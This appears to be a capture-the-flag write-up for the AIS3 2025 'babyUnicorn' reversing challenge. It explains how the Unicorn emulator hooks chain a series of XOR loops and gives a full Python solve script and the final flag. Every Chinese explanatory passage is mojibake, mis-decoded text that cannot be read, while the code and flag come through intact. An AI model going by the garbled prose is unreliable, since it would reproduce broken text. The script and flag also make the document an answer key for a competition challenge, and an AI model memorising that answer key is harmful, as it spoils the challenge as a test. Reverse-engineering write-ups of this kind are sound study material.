    - set `eip = ADDRESS_CODE`, `esi = 0x6`

#### code

ç”¨ binary ninja load x86 raw binary å¯ä»¥ç™¼ç¾ `ADDRESS_CODE` æ˜¯ä¸€å€‹ function (å¾Œç¨± `func`) ä¸¦ä¸”ä¾ç…§ `arg2 (esi)` åŸ·è¡Œä¸åŒ case

```c
01000000    int32_t sub_1000000(void* arg1 @ ebp, int32_t arg2 @ esi)
```

æ›´ä»”ç´°è§€å¯Ÿç™¼ç¾æ‰€æœ‰çš„ case éƒ½æ˜¯ä¸€æ¨£çš„çµæ§‹

```c
for (int i = <st>; i != <ed>; i += 1)
    // flag[<offset> - 0x20 + i] ^= flag[i % 0x2f]
    *(ebp + <offset> + i) ^= *(ebp + 0x20 + i % 0x2f);
trap(<exception_type>); // int <exception_type> 
```

#### dynamic analysis

åŠ å…¥ä¸€äº› verbode å¾ŒåŸ·è¡Œå¯ä»¥çœ‹åˆ°å¤§éƒ¨åˆ†éƒ½æ˜¯ `got exception`

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\babyUnicorn\verbose.png)

å¾ hook code, `code` é‚„æœ‰åŸ·è¡Œçµæœå¯ä»¥æ¨å‡ºåŸ·è¡Œé †åº (ä»¥ä¸‹çš„ `func(num)` ä»£è¡¨è¨­ `esi = num`ï¼Œç„¶å¾ŒåŸ·è¡Œ `ADDRESS_CODE`ï¼Œä¸¦ä¸æ˜¯ `call`ï¼Œcall functiom æœƒæ”¹åˆ° stackï¼Œä½† hook ç›´æ¥æ”¹ rip ä¸æœƒå‹•åˆ° stackï¼Œæœ¬è³ªä¸Šæ¯”è¼ƒåƒ `jmp`)

1. `main()` åŸ·è¡Œ `func(0x2)`
2. `func(0x2) trap(0x61)` 
3. `hook_exception` æ””åˆ° `int 0x61`
4. `hook_exception` åŸ·è¡Œ `func(0x61)`
5. `func(0x61) trap(0x10)` 
6. `hook_exception` æ””åˆ° `int 0x10`
7. `hook_exception` åŸ·è¡Œ `func(0x10)`
8. ...

ç¹¼çºŒå¾€ä¸‹çœ‹æœƒçœ‹åˆ° `func(0x54)` è£¡åŸ·è¡Œäº† `cpuid`ï¼Œæ¥è‘—æœƒè¢« `hook_insn` è·Ÿ `hook_code1` æ””åˆ°ä¸¦åŸ·è¡Œ `func(0x6)`ï¼Œå¯ä»¥çœ‹ `case 6` è£¡ç¢ºå¯¦æœ‰ `trap(0x2d)` ä¾†é©—è­‰

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\babyUnicorn\cpuid.png)

å†ä¾†åˆæ˜¯ä¸€å¤§ä¸²è·Ÿå‰é¢ç›¸åŒçš„ `got exception` ç›´åˆ° `0x14`ï¼Œ`func(0x14)` æœƒå…ˆ `trap(0x6)` è·‘å®Œç„¶å¾Œè§¸ç™¼ç¬¬äºŒæ¬¡ `int 0x2d` çš„ `exit()`ï¼Œæœ€å¾Œé€² `hook_code2` çš„ flag check

![alt text]({{site.baseurl}}\assets\images\AIS3-2025-pre-exam\babyUnicorn\exit.png)

#### script

å·²çŸ¥ target ä»¥åŠæ‰€æœ‰ xor loop çš„é †åºï¼Œåªéœ€è¦å€’è‘—åšå›å»å°±èƒ½å¾—åˆ° flagï¼Œæ¯å€‹ xor loop å¯ä»¥ç”¨ä»¥ä¸‹é‚„åŸ

```python
def xor(off_rsp, start, end):
    for i in range(start, end)[::-1]:
        off_flag = off_rsp - 0x20
        if off_flag + i < 0 or off_flag + i >= FLAG_LEN:
            continue
        flag[off_flag + i] ^= flag[i % 0x2f]
```

ç”¨å·¥äººæ™ºæ…§æŠŠæ¯å€‹ xor loop çš„åƒæ•¸æ‰¾å‡ºä¾†å°±æœ‰ flag äº†ï¼Œå¤§éƒ¨åˆ†éƒ½ trivialï¼Œfor loop æœ‰ `st`, `ed`ï¼Œassembly æœ‰ offsetï¼›é™¤äº† case 0x11 è·Ÿ 0x18 æ‰¾ä¸åˆ° `st`ï¼Œå¾ assembly çœ‹åˆ°æ˜¯æ‹¿ `esi` ç•¶ `i` ç®—ï¼Œä¹Ÿå°±æ˜¯ `st = 0x11 or 0x18`

```asm
// trivial
00000650  8d742403  lea     esi, [rsp+0x3 {__return_addr+0x3}]
00000668  30040e    xor     byte [rsi+rcx], al
```

```asm
// case 0x11, 0x18
01000d40  300431  xor     byte [ecx+esi], al {arg_f} {arg_f}
```

<button type="button" class="collapsible" id="babyUnicorn-solve-script">Full script</button>
<div class="hidden-content" id="babyUnicorn-solve-script-data" markdown="1">

```python
from pwn import *

FLAG_LEN = 47
flag =  [
    0x5a, 0x60, 0x61, 0xf, 0x8, 0x29, 0x42, 0x32,
    0x25, 0x23, 0x42, 0x68, 0x4b, 0x41, 0x63, 0x55,
    0x37, 0x43, 0x6a, 0x50, 0x40, 0x6f, 0x2e, 0x66,
    0x49, 0x7f, 0x9, 0x66, 0x79, 0x7c, 0x37, 0x18,
    0x5d, 0x35, 0x46, 0x41, 0x37, 0xf, 0x19, 0x1c,
    0x30, 0x79, 0x29, 0x69, 0xa, 0x46, 0x3b
]

def xor(off_rsp, start, end):
    for i in range(start, end)[::-1]:
        off_flag = off_rsp - 0x20
        if off_flag + i < 0 or off_flag + i >= FLAG_LEN:
            continue
        flag[off_flag + i] ^= flag[i % 0x2f]

# 0x6
xor(0x3, 0x1d, 0x3b)
# 0x14
xor(-0x9, 0x29, 0x53)
# 0x1e
xor(0x13, 0xd, 0x1b)
# 0x3c
xor(0x8, 0x18, 0x31)
# 0x9
xor(-0xe, 0x2e, 0x5d)
# 0x2c
xor(0xd, 0x13, 0x27)
# 0x53
xor(-0xa, 0x2a, 0x55)
# 0x41
xor(-0x1, 0x21, 0x43)
# 0x25
xor(0x6, 0x1a, 0x35)
# 0x5f
xor(-0x7, 0x27, 0x4f)
# 0x22
xor(0x17, 0x9, 0x13)
# 0x4e
xor(-0x6, 0x26, 0x4d)
# 0x19
xor(0x13, 0xd, 0x1b)
# 0x2a
xor(0xc, 0x14, 0x29)
# 0x45
xor(0x1e, 0x2, 0x5)
# 0x3e
xor(-0x2, 0x22, 0x45)
# 0x7
xor(0x11, 0xf, 0x1f)
# 0x11
xor(0xf, 0x11, 0x23)
# 0x60
xor(0x1e, 0x2, 0x5)
# 0x46
xor(-0xc, 0x2c, 0x59)
# 0x35
xor(-0x4, 0x24, 0x49)
# 0x26
xor(0x17, 0x9, 0x13)
# 0x4
xor(0x16, 0xa, 0x15)
# 0x3a
xor(0x1e, 0x2, 0x5)
# 0x5a
xor(0x1c, 0x4, 0x9)
# 0x64
xor(0xa, 0x16, 0x2d)
# 0x4d
xor(0x3, 0x1d, 0x3b)
# 0x51
xor(0xb, 0x15, 0x2b)
# 0x24
xor(-0x6, 0x26, 0x4d)
# 0x32
xor(0xd, 0x13, 0x27)
# 0x4b
xor(0x1a, 0x6, 0xd)
# 0xb
xor(0x18, 0x8, 0x11)
# 0x4a
xor(0x5, 0x1b, 0x37)
# 0x33
xor(0x8, 0x18, 0x31)
# 0x30
xor(-0xb, 0x2b, 0x57)
# 0x28
xor(0xa, 0x16, 0x2d)
# 0x43
xor(-0x3, 0x23, 0x47)
# 0x49
xor(-0x4, 0x24, 0x49)
# 0x34
xor(-0xd, 0x2d, 0x5b)
# 0x23
xor(0x14, 0xc, 0x19)
# 0xd
xor(0xd, 0x13, 0x27)
# 0x4c
xor(0x0, 0x20, 0x41)
# 0x16
xor(-0xb, 0x2b, 0x57)
# 0x3f
xor(0xa, 0x16, 0x2d)
# 0x52
xor(0xb, 0x15, 0x2b)
# 0x1
xor(0x1c, 0x4, 0x9)
# 0x17
xor(0xf, 0x11, 0x23)
# 0x47
xor(-0x8, 0x28, 0x51)
# 0x21
xor(0xf, 0x11, 0x23)
# 0x5e
xor(0x9, 0x17, 0x2f)
# 0x1d
xor(0x1e, 0x2, 0x5)
# 0x2e
xor(0x7, 0x19, 0x33)
# 0x44
xor(0x12, 0xe, 0x1d)
# 0x50
xor(0xe, 0x12, 0x25)
# 0x2b
xor(0x13, 0xd, 0x1b)
# 0x20
xor(0x15, 0xb, 0x17)
# 0x5c
xor(-0x9, 0x29, 0x53)
# 0x2f
xor(0x18, 0x8, 0x11)
# 0x1b
xor(0x18, 0x8, 0x11)
# 0x1c
xor(0x8, 0x18, 0x31)
# 0xa
xor(0x1d, 0x3, 0x7)
# 0x48
xor(0x12, 0xe, 0x1d)
# 0x55
xor(0x3, 0x1d, 0x3b)
# 0x3b
xor(0x3, 0x1d, 0x3b)
# 0x58
xor(0x8, 0x18, 0x31)
# 0x18
xor(0x8, 0x18, 0x31)
# 0x27
xor(0x6, 0x1a, 0x35)
# 0x3
xor(0x1a, 0x6, 0xd)
# 0xf
xor(0x15, 0xb, 0x17)
# 0x39
xor(0xc, 0x14, 0x29)
# 0xe
xor(-0xa, 0x2a, 0x55)
# 0x40
xor(0x12, 0xe, 0x1d)
# 0x12
xor(0xb, 0x15, 0x2b)
# 0x36
xor(0x1, 0x1f, 0x3f)
# 0x2d
xor(0x8, 0x18, 0x31)
# 0x6
xor(0x3, 0x1d, 0x3b)
# 0x54
xor(0x15, 0xb, 0x17)
# 0x56
xor(-0x4, 0x24, 0x49)
# 0x13
xor(0x13, 0xd, 0x1b)
# 0x31
xor(0xe, 0x12, 0x25)
# 0x1f
xor(0x3, 0x1d, 0x3b)
# 0x37
xor(-0x4, 0x24, 0x49)
# 0x10
xor(0x8, 0x18, 0x31)
# 0x61
xor(0x0, 0x20, 0x41)
# 0x02
xor(-0x8, 0x28, 0x51)

p = process(["python", "chal.py"])

print(bytes(flag))
p.sendlineafter(b"Enter the flag:", bytes(flag))
p.recvline()

p.interactive()
```
</div>

**Flag: AIS3{UniCorn_2.1.3_fk_s1ow_BUT_this_chal_cool?}** 